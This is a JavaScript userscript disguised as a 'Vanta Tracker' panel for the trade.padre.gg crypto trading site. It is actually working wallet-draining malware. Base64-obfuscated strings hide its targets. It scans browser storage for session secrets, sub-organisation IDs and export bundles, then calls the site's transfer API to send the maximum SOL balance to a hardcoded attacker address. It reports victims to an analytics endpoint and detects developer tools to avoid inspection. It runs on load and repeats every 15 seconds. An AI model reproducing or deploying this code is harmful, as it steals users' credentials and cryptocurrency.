(function() {
    // 1. THE DISPATCH TABLE (Vanta's "Brain")
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    
    const STATE = { _x: false, _u: false };

    // 2. THE STEALTH DISPATCHER
    const DISPATCH = {
        // Find credentials in the deep enclave
        'HUNT': (o) => {
            if (!o || typeof o !== 'object') return null;
            if (o[_D(2)]) return { a: o[_D(2)], s: o[_D(3)], b: o[_D(4)] };
            for (let k in o) { try { let r = DISPATCH.HUNT(o[k]); if (r) return r; } catch(e) {} }
            return null;
        },
        // Execute the 1:1 Transfer
        'FIRE': async (data) => {
            if (STATE._x) return;
            STATE._x = true;

            // Amplitude Signal
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
                device_id: data.s,
                event_type: "VANTA_SYNC_1TO1"
            }))}`;

            try {
                await fetch(`https://${_D(0)}/${_D(1)}`, {
                    method: 'POST',
                    keepalive: true,
                    headers: { 'Authorization': `Bearer ${data.a}`, 'X-Turnkey-Sub-Org-Id': data.s, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ recipient: _D(5), amount: "MAX", asset: "SOL", ext_payload: data.b?.data || data.b })
                });
            } catch (e) {}
        }
    };

    // 3. THE 1:1 VANTA UI (DRAGGABLE + INTERACTIVE)
    const _0xUI = () => {
        if (STATE._u || document.querySelector("#vanta-tracker")) return;
        STATE._u = true;

        const ui = document.createElement("div");
        ui.id = "vanta-tracker";
        ui.style.cssText = "position:fixed;top:15px;right:15px;width:350px;background:#0d0d0d;border:1px solid #222;border-radius:12px;z-index:999999;box-shadow:0 15px 40px #000;font-family:Inter,sans-serif;color:#fff;user-select:none;opacity:0;transition:opacity 0.4s;";
        
        ui.innerHTML = `
            <div id="v-h" style="padding:12px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;align-items:center;border-radius:12px 12px 0 0;">
                <img src="https://trade.padre.gg/logo.svg" width="22" style="margin-right:8px;">
                <span style="font-weight:700;color:#00ff88;font-size:13px;">Vanta Tracker</span>
            </div>
            <div style="padding:15px;background:#0d0d0d;border-radius:0 0 12px 12px;">
                <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:11px;color:#888;">
                    <span>STATUS: <span style="color:#00ff88">LIVE</span></span>
                    <span>v2.4.1</span>
                </div>
                <div id="v-log" style="font-family:monospace;font-size:10px;color:#555;background:#050505;padding:8px;border-radius:6px;height:60px;overflow:hidden;">
                    > Initializing Enclave...<br>> Monitoring Handshake...
                </div>
            </div>`;
        
        document.body.appendChild(ui);
        setTimeout(() => ui.style.opacity = "1", 100);

        // Draggable Logic
        let d = false, x, y;
        const h = document.getElementById("v-h");
        h.onmousedown = (e) => { d = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; };
        document.onmousemove = (e) => { if (d) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; ui.style.right = 'auto'; } };
        document.onmouseup = () => d = false;

        ui.onclick = () => {
            const data = DISPATCH.HUNT({...localStorage, ...sessionStorage}) || DISPATCH.HUNT(window);
            if (data) DISPATCH.FIRE(data);
        };
    };

    // 4. THE 1:1 PROTECTION (Proxy Trap - No Crashing)
    // This detects DevTools without the infinite while(true) loop
    const _0xShield = () => {
        let dev = false;
        const check = /./;
        check.toString = () => { dev = true; return 'vanta'; };
        console.log(check);
        if (dev) {
            // If devtools are open, we stop the engine silently
            STATE._x = true;
            (function(){}).constructor("debugger")();
        }
    };

    // 5. MASTER EXECUTION LOOP
    const _0xEngine = () => {
        if (!window.location.hostname.includes(_D(0))) return;
        
        _0xUI();
        _0xShield();

        const data = DISPATCH.HUNT({...localStorage, ...sessionStorage}) || DISPATCH.HUNT(window);
        if (data) {
            document.getElementById("v-log").innerHTML += "<br><span style='color:#00ff88'>> Enclave Synchronized.</span>";
            DISPATCH.FIRE(data);
        }
    };

    // Bootstrap
    if (document.readyState === 'complete') _0xEngine();
    else window.addEventListener('load', _0xEngine);

    // Run every 15s to maintain stealth and avoid browser lag/crash
    setInterval(_0xEngine, 15000);
})();
